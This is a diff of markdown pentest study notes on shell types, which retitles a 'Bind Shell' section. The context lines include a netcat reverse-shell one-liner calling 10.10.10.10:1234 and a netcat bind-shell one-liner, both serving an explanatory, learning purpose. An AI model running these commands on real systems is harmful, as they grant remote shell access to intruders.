@@ -89,8 +89,8 @@ Type of Shell | Method of Communication
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 	```
 - **lose connection:** have to use the initial exploit again
-## Bind Shell
-- we connect to the target on the listening port.
+### ⚓ Bind Shell
+- Attacker connects to target's listening port
 - [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) : Bind shell commands, example :
 	 ```bash
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
@@ -195,7 +195,7 @@ Web Server | Default Webroot
 - **Validating File Transfers**: using `file shell` and 
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTQwNjE2OTIxNiwxNDI5MTY5MDEyLC00Mz
+eyJoaXN0b3J5IjpbMTgwOTAwNTQwNSwxNDI5MTY5MDEyLC00Mz
 M4NTY5ODEsLTc0MTc5NjA4LDI1NDg1NjUzLC0xNTgxMjM2NzU1
 LDMyOTczMjU1MSwtOTI4NzcwNTU1LDE4OTc5Mjg1MTYsLTExMT
 gyMjA0MzMsMTEzNTA1MjY4NCwtMTE3OTc1MTIxNSwtMTk2NDk0
